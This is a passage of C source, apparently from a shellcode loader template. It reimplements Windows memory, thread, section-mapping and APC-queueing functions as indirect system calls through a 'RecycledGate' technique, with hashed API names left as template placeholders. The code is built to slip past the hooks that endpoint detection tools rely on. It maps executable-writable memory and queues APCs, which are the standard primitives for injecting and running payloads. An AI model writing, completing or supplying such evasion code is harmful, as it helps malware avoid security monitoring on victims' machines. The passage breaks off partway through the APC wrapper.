SYSCALL_ENTRY g_NtClose = {0};

void InitSyscall(DWORD hash, PSYSCALL_ENTRY pEntry) {
    if (pEntry->pRecycledGate == NULL) {
        getSyscall(hash, pEntry);
    }
}

LPVOID WINAPI RG_VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    InitSyscall({{ hash_rg_ntallocatevirtualmemory }}, &g_NtAllocateVirtualMemory);
    if (!g_NtAllocateVirtualMemory.pRecycledGate) return NULL;

    PVOID baseAddress = lpAddress;
    SIZE_T regionSize = dwSize;
    
    PrepareSyscall(g_NtAllocateVirtualMemory.dwSyscallNr, g_NtAllocateVirtualMemory.pRecycledGate);
    NTSTATUS status = DoSyscall(
        (HANDLE)-1, 
        &baseAddress,
        (ULONG_PTR)0,
        &regionSize,
        flAllocationType,
        flProtect
    );
    
    if (status >= 0) return baseAddress;
    DEBUG_PRINT("RG_VirtualAlloc: NtAllocateVirtualMemory failed with status: 0x%08X", status);
    return NULL;
}

DWORD WINAPI RG_WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
    InitSyscall({{ hash_rg_ntwaitforsingleobject }}, &g_NtWaitForSingleObject);
    if (!g_NtWaitForSingleObject.pRecycledGate) return -1;
    
    LARGE_INTEGER timeout;
    PLARGE_INTEGER pTimeout = NULL;
    
    if (dwMilliseconds != INFINITE) {
        timeout.QuadPart = -(LONGLONG)dwMilliseconds * 10000;
        pTimeout = &timeout;
    }

    PrepareSyscall(g_NtWaitForSingleObject.dwSyscallNr, g_NtWaitForSingleObject.pRecycledGate);
    NTSTATUS status = DoSyscall(hHandle, FALSE, pTimeout);

    if (status == 0x00000000) return 0;
    if (status == 0x00000102) return 258;
    return -1;
}

// CreateThread -> NtCreateThreadEx
HANDLE WINAPI RG_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    InitSyscall({{ hash_rg_ntcreatethreadex }}, &g_NtCreateThreadEx);
    if (!g_NtCreateThreadEx.pRecycledGate) return NULL;
    
    HANDLE hThread;
    ULONG createFlags = (dwCreationFlags & 0x00000004) ? 1 : 0; // Map CREATE_SUSPENDED (4) to Nt flag (1)
    
    PrepareSyscall(g_NtCreateThreadEx.dwSyscallNr, g_NtCreateThreadEx.pRecycledGate);
    // NtCreateThreadEx(&hThread, ACCESS, NULL, ProcessHandle, StartAddr, Param, Flags, ZeroBits, StackSize, MaxStackSize, AttrList)
    NTSTATUS status = DoSyscall(
        &hThread,
        (ACCESS_MASK)0x1FFFFF, // THREAD_ALL_ACCESS
        NULL,
        (HANDLE)-1,
        lpStartAddress,
        lpParameter,
        createFlags, 
        (ULONG_PTR)0, 
        (SIZE_T)0, 
        (SIZE_T)0, 
        NULL
    );

    if (status >= 0) {
        if (lpThreadId) *lpThreadId = (DWORD)0;
        return hThread;
    }
    
    DEBUG_PRINT("RG_CreateThread: NtCreateThreadEx failed with status: 0x%08X", status);
    return NULL;
}

HANDLE WINAPI RG_CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName) {
    InitSyscall({{ hash_rg_ntcreatesection }}, &g_NtCreateSection);
    if (!g_NtCreateSection.pRecycledGate) return NULL;
    
    HANDLE hSection;
    LARGE_INTEGER maxSize;
    maxSize.LowPart = dwMaximumSizeLow;
    maxSize.HighPart = dwMaximumSizeHigh;
    
    DWORD allocationAttributes = SEC_COMMIT;
    
    HANDLE hFileHandle = hFile;
    if (hFileHandle == INVALID_HANDLE_VALUE) {
        hFileHandle = NULL;
    }

    PrepareSyscall(g_NtCreateSection.dwSyscallNr, g_NtCreateSection.pRecycledGate);
    NTSTATUS status = DoSyscall(
        &hSection,
        (ACCESS_MASK)SECTION_ALL_ACCESS,
        NULL,
        &maxSize,
        flProtect, 
        allocationAttributes,
        hFileHandle
    );
    
    if (status >= 0) return hSection;
    DEBUG_PRINT("RG_CreateFileMappingW: NtCreateSection failed with status: 0x%08X", status);
    return NULL;
}

LPVOID WINAPI RG_MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap) {
    InitSyscall({{ hash_rg_ntmapviewofsection }}, &g_NtMapViewOfSection);
    if (!g_NtMapViewOfSection.pRecycledGate) return NULL;
    
    PVOID baseAddress = NULL;
    SIZE_T viewSize = dwNumberOfBytesToMap;
    LARGE_INTEGER sectionOffset;
    sectionOffset.LowPart = dwFileOffsetLow;
    sectionOffset.HighPart = dwFileOffsetHigh;
    
    PrepareSyscall(g_NtMapViewOfSection.dwSyscallNr, g_NtMapViewOfSection.pRecycledGate);
    NTSTATUS status = DoSyscall(
        hFileMappingObject,
        (HANDLE)-1,
        &baseAddress,
        (ULONG_PTR)0,
        (SIZE_T)0,
        &sectionOffset,
        &viewSize,
        2, 
        0,
        PAGE_EXECUTE_READWRITE 
    );
    
    if (status >= 0) return baseAddress;
    DEBUG_PRINT("RG_MapViewOfFile: NtMapViewOfSection failed with status: 0x%08X", status);
    return NULL;
}

NTSTATUS WINAPI RG_NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle) {
    InitSyscall({{ hash_rg_ntcreatesection }}, &g_NtCreateSection);
    if (!g_NtCreateSection.pRecycledGate) return 0xC0000001;
    
    PrepareSyscall(g_NtCreateSection.dwSyscallNr, g_NtCreateSection.pRecycledGate);
    return DoSyscall(
        SectionHandle,
        DesiredAccess,
        ObjectAttributes,
        MaximumSize,
        SectionPageProtection,
        AllocationAttributes,
        FileHandle
    );
}

NTSTATUS WINAPI RG_NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, UINT InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {
    InitSyscall({{ hash_rg_ntmapviewofsection }}, &g_NtMapViewOfSection);
    if (!g_NtMapViewOfSection.pRecycledGate) return 0xC0000001; 
    
    PrepareSyscall(g_NtMapViewOfSection.dwSyscallNr, g_NtMapViewOfSection.pRecycledGate);
    return DoSyscall(
        SectionHandle,
        ProcessHandle,
        BaseAddress,
        ZeroBits,
        CommitSize,
        SectionOffset,
        ViewSize,
        InheritDisposition,
        AllocationType,
        Win32Protect
    );
}

BOOL WINAPI RG_CloseHandle(HANDLE hObject) {
    InitSyscall({{ hash_rg_ntclose }}, &g_NtClose);
    if (!g_NtClose.pRecycledGate) return FALSE;
    
    PrepareSyscall(g_NtClose.dwSyscallNr, g_NtClose.pRecycledGate);
    NTSTATUS status = DoSyscall(hObject);
    return (status >= 0);
}

DWORD WINAPI RG_QueueUserAPC(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData) {
    InitSyscall({{ hash_rg_ntqueueapcthread }}, &g_NtQueueApcThread);
    if (!g_NtQueueApcThread.pRecycledGate) return 0;
    
    PrepareSyscall(g_NtQueueApcThread.dwSyscallNr, g_NtQueueApcThread.pRecycledGate);
    NTSTATUS status = DoSyscall(
        hThread,
        pfnAPC,
        dwData,
        NULL,
        NULL
